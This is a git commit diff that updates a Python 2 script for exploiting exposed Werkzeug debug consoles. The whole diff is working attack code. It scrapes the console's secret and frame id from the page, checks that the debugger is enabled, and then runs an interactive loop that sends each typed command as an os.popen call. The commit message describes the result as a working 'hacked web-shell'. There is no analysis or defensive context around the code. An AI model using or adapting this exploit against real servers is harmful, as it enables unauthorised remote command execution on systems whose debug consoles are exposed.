e1008f141ccd4d054161789c43a6a449cba3df95
SamDubYah <31736019+SamDubYah@users.noreply.github.com>
2019-10-18 14:18:57 -0400

    Updated script to working version
    Works and creates a hacked web-shell.

--- web_scripts/Werkzeug_hack_shell.py
+++ web_scripts/Werkzeug_hack_shell.py
@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # Author: SamDubYah
-# Date: Oct 16 2019
+# Date: Oct 18 2019
 ###
 ### This tool will exploit the vulnerability in
 ### the Werkzeug web application by using a loop to continue
@@ -10,56 +10,80 @@
 ### a shell on the machine using a forever while loop.
 ###
 
+##### To-Do #####
+##### 1. Add sanity check for werkzeug footer
+##### 2. Add ability to import python rshell
+##### 3. Verify URL supplied is URL
+
 import sys
 import requests
 import re
 import urllib
+from bs4 import BeautifulSoup
+
 
 def usage():
     print "\nThis is a simple program to Exploit Werkzeug"
-    print "\nusage: python Werkzeug.py http://www.examlple.com/path/to/console\n"
+    print "\nusage: python Werkzeug.py http://www.example.com/path/to/console\n"
 
+# Checks that an additional argument is supplied
 if len(sys.argv) != 2:
     usage()
     sys.exit(-1)
 
+# Setting static variables
 url = sys.argv[1]
-
-response = requests.get(url)
-
-secret = re.findall("[0-9a-zA-Z]{20}",response.text)
 
 __debugger__ = 'yes'
 
-frm = '0'
 
+#getting response to parse for secret & frm
+response = requests.get(url)
+
+# Finding the secret and frm key from the response.text
+secret = re.findall("[0-9a-zA-Z]{20}",response.text)
+frm = re.findall("[0-9]{15}",response.text)
+
+# Sanity check for frm and secret strings
 if len(secret) != 1:
-    print "unable to obtain secret"
+    print "[-] Unable to find secret"
     sys.exit(-1)
+elif len(frm) == 0:
+    print "[!] Unable to find frm"
+    print "[!] Defaulting frm to 0"
+    frm = '0'
 else:
+    #If everything correct, set secret to first instance found and frm to second
     secret = secret[0]
-    print "[+]The secret is: " + str(secret)
+    frm = frm[1]
+    print "[+] Secret found: " + str(secret)
+    print "[+] Frm found: " + str(frm)
+
+# Getting response for werkzeug sanity check
+response = requests.get(url)
+
+# Sanity check on debug werkzeug console
+if "Werkzeug powered traceback interpreter" not in response.text:
+    print "[-] Debug not enabled"
+    sys.exit(-1)
+
 
 print ("[+] starting hacked shell on " + url)
 print ("[+] use Ctrl + C to kill shell")
 
 
+# Start of while loop hacked shell
 while(1):
 
+    #Getting user raw input to implement commands
     shell_cmd = raw_input("#:")
-    cmd = ('''__import__('os').popen('%s').read();''' % shell_cmd)
-    print (cmd)
+    cmd = ('''__import__('os').popen('%s').read();''' % shell_cmd) #setting the cmd with user supplied input
 
-    data = {
-            '__debugger__' : __debugger__,
-            'cmd' : str(cmd),
-            'frm' : frm,
-            's' : secret
-            }
+    #response to be sent to werkzeug debug console
+    response = requests.get("%s?__debugger__=yes&cmd=%s&frm=%s&s=%s"% (url, str(cmd), frm, secret))
 
-    response = requests.get(url, params=data, headers=response.headers)
-
+    #Server's response Debug information
     print "[+] Response from server"
     print "[+] Status code: " + str(response.status_code)
-    print "[+] Response: " + str(response.text)
+    print "[+] Response: " + BeautifulSoup(response.text, "html.parser").get_text()
 
